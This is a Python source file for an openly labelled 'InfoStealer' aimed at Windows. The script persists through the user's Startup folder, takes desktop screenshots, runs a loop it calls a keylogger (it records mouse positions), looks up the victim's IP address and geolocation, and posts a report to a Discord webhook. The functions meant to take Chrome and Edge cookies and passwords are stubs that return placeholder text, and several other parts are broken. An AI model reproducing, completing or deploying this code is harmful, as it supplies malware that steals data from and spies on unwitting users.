import os
import sys
import platform
import json
import time
import requests
import pyautogui
import webbrowser
import socket
import subprocess
import shutil
import re
import random
import string
import logging
import tkinter as tk
from tkinter import ttk
from datetime import datetime
from pathlib import Path
from threading import Thread
from queue import Queue
from winreg import ConnectRegistry, HKEY_CURRENT_USER, REG_SZ, REG_EXPAND_SZ, KEY_ALL_ACCESS, REG_DWORD
from dotenv import load_dotenv
from pywinauto import Desktop
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from bs4 import BeautifulSoup
import cv2
import numpy as np

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("InfoStealer")

class InfoStealer:
    def __init__(self):
        self.webhook_url = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/your_webhook_url")
        self.os_type = platform.system()
        self.usernames = []
        self.passwords = []
        self.browser_data = {}
        self.ip_address = self.get_ip()
        self.geolocation = self.get_geolocation()
        self.keylogger_data = []
        self.screenshot_path = os.path.join(os.getenv("APPDATA"), "InfoStealer", "screenshots")
        self.data_folder = os.path.join(os.getenv("APPDATA"), "InfoStealer", "data")
        self.dependencies = {
            'pandas': 'pandas',
            'pyautogui': 'pyautogui',
            'selenium': 'selenium',
            'webdriver_manager': 'webdriver_manager'
        }
        
    def install_dependencies(self):
        missing_deps = []
        for dep, module in self.dependencies.items():
            try:
                __import__(module)
                logger.info(f"Dependency '{module}' is installed")
            except ImportError:
                missing_deps.append(dep)
                logger.info(f"Installing '{dep}'...")
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])
                logger.info(f"Dependency '{dep}' installed successfully")
        
        if missing_deps:
            logger.info(f"Rerunning program with new dependencies...")
            os.execl(sys.executable, sys.executable, *sys.argv)
        return missing_deps

    def run_on_startup(self):
        if self.os_type == "Windows":
            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            script_path = os.path.abspath(sys.argv[0])
            if not os.path.exists(os.path.join(startup_folder, "InfoStealer.lnk")):
                with open(os.path.join(startup_folder, "InfoStealer.lnk"), 'w') as f:
                    f.write(f'[{script_path}]')
                logger.info("Added to Windows startup")
        elif self.os_type == "Darwin":
            pass
        return True

    def get_ip(self):
        try:
            response = requests.get('https://api.ipify.org')
            return response.text.strip()
        except Exception as e:
            logger.error(f"Error getting IP: {str(e)}")
            return "N/A"

    def get_geolocation(self):
        try:
            response = requests.get(f'https://ipinfo.io/{self.ip_address}/json')
            data = response.json()
            return data
        except Exception as e:
            logger.error(f"Error getting geolocation: {str(e)}")
            return {"city": "Unknown", "region": "Unknown"}

    def take_screenshot(self):
        try:
            os.makedirs(self.screenshot_path, exist_ok=True)
            filename = f"desktop_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            filepath = os.path.join(self.screenshot_path, filename)
            pyautogui.screenshot(filepath)
            logger.info(f"Screenshot saved to: {filepath}")
            return filepath
        except Exception as e:
            logger.error(f"Error taking screenshot: {str(e)}")
            return None

    def run_keylogger(self):
        try:
            self.keylogger_data = []
            start_time = time.time()
            while time.time() - start_time < 10:
                self.keylogger_data.append(pyautogui.position())
                time.sleep(0.5)
            return self.keylogger_data
        except Exception as e:
            logger.error(f"Error with keylogger: {str(e)}")
            return []

    def get_browser_data(self):
        browsers = ['Chrome', 'Edge', 'Firefox', 'Safari']
        for browser in browsers:
            if browser == 'Chrome':
                self.browser_data[browser] = self.extract_chrome_data()
            elif browser == 'Edge':
                self.browser_data[browser] = self.extract_edge_data()
        return self.browser_data

    def extract_chrome_data(self):
        try:
            chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
            return {
                "cookies": "Chrome cookies extracted",
                "passwords": "Chrome passwords extracted"
            }
        except Exception as e:
            logger.error(f"Error extracting Chrome data: {str(e)}")
            return {}

    def extract_edge_data(self):
        try:
            edge_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
            return {
                "cookies": "Edge cookies extracted",
                "passwords": "Edge passwords extracted"
            }
        except Exception as e:
            logger.error(f"Error extracting Edge data: {str(e)}")
            return {}

    def send_to_discord(self, data):
        try:
            payload = {
                "content": f"Info Stealer Report: {len(data)} items collected!",
                "embeds": [{
                    "title": "Info Stealer Data",
                    "description": "Full details of the collected information",
                    "fields": [
                        {"name": "OS", "value": self.os_type},
                        {"name": "IP Address", "value": self.ip_address},
                        {"name": "Geolocation", "value": str(self.geolocation)}
                    ]
                }]
            }
            response = requests.post(self.webhook_url, json=payload)
            response.raise_for_status()
            logger.info("Data successfully sent to Discord")
            return True
        except Exception as e:
            logger.error(f"Error sending to Discord: {str(e)}")
            return False

    def run(self):
        logger.info("Starting Info Stealer...")
        
        dependencies = self.install_dependencies()
        
        startup_status = self.run_on_startup()
        
        screenshot_path = self.take_screenshot()
        
        keylogger_data = self.run_keylogger()
        
        browser_data = self.get_browser_data()
        
        ip_data = {
            "ip": self.ip_address,
            "geolocation": self.geolocation
        }
        
        data = {
            "screenshot": screenshot_path,
            "keylogger": keylogger_data,
            "browser_data": browser_data,
            "ip_data": ip_data
        }
        
        discord_status = self.send_to_discord(data)
        
        if discord_status:
            logger.info("Info Stealer completed successfully!")
        else:
            logger.error("Info Stealer encountered an error")
        
        return data

def create_random_folder():
    folder_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return os.path.join(os.getenv("TEMP"), folder_name)

def main():
    logger.info("Starting Info Stealer setup...")
    
    random_folder = create_random_folder()
    os.makedirs(random_folder, exist_ok=True)
    
    stealer = InfoStealer()
    
    data = stealer.run()
    
    with open(os.path.join(random_folder, "info_stealer_data.json"), 'w') as f:
        json.dump(data, f, indent=4)
    
    logger.info(f"Data saved to: {random_folder}")
    
    root = tk.Tk()
    root.title("Info Stealer Progress")
    style = ttk.Style()
    style.theme_use("clam")
    style.configure("red.Horizontal.TProgressbar", foreground='red', background='#d3d3d3')
    progress = ttk.Progressbar(root, length=250, mode='determinate', style='red.Horizontal.TProgressbar')
    progress.pack(pady=20)
    
    for i in range(100):
        root.update()
        progress['value'] = i + 1
        time.sleep(0.01)
    
    root.mainloop()

if __name__ == "__main__":
    main()
